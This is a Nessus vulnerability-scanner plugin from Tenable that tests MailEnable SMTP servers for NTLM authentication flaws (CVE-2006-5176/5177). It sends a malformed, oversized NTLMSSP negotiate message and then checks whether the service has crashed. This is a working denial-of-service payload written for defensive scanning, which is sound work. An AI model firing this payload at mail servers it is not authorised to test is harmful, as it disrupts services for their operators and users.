#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(22483);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-5176", "CVE-2006-5177");
  script_bugtraq_id(20290);
  script_xref(name:"OSVDB", value:"29432");
  script_xref(name:"OSVDB", value:"29433");
  script_xref(name:"OSVDB", value:"29434");

  script_name(english:"MailEnable SMTP Connector Multiple NTLM Authentication Vulnerabilities");
  script_summary(english:"Tries to crash MailEnable SMTP server");

 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is affected by multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running MailEnable, a commercial mail server for
Windows. 

The version of MailEnable Professional or MailEnable Enterprise
installed on the remote host has several problems involving its
support of NTLM authentication.  A remote, unauthenticated attacker
can leverage these flaws to execute arbitrary code on the remote host
or crash the SMTP connector. 

Note that NTLM authentication is not enabled in MailEnable by default
but is on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://labs.musecurity.com/advisories/MU-200609-01.txt" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2006-09/0561.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.mailenable.com/hotfix/" );
 script_set_attribute(attribute:"solution", value:
"Apply the ME-10015 hotfix referenced in the vendor link above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"SMTP problems");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_exclude_keys("SMTP/wrapped");

  exit(0);
}


include("misc_func.inc");
include("smtp_func.inc");


port = get_kb_item("Services/smtp");
if (!port) port = 25;
if (!get_port_state(port)) exit(0);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


# Make sure the banner corresponds to MailEnable.
banner = get_smtp_banner(port:port);
if (
  !banner || 
  !egrep(pattern:"Mail(Enable| Enable SMTP) Service", string:banner)
) exit(0);


# Open a connection and make sure NTLM authentication is supported.
soc = smtp_open(port:port);
if (!soc) exit(0);

c = raw_string("EHLO ", this_host_name());
send(socket:soc, data:string(c, "\r\n"));
s = smtp_recv_line(socket:soc);
if (!egrep(pattern:"^250-AUTH.* NTLM", string:s)) exit(0);


# Try to exploit the flaw to crash the daemon.
negotiate = raw_string(
  crap(100), 0x00,                     # NTLMSSP identifier
  0x01, 0x00, 0x00, 0x00,              # NTLMSSP_NEGOTIATE
  0x07, 0x82, 0x08, 0x00,              # flags
  "nessus",                            # calling workstation domain
  SCRIPT_NAME,                         # calling workstation name
  0x00
);
c = string("AUTH NTLM ", base64(str:negotiate), "\r\n");
send(socket:soc, data:c);
close(soc);


# Check if the service has died.
#
# nb: it doesn't crash right away.
failed = 0;
max_tries = 10;
for (iter=0; iter < max_tries; iter++)
{
  soc = open_sock_tcp(port);
  if (soc)
  {
    failed = 0;
    close(soc);
  }
  else
  {
    # Call it a problem if we see three consecutive failures to connect.
    if (++failed > 2)
    {
        security_hole(port);
        exit(0);
    }
  }
  sleep(1);
}
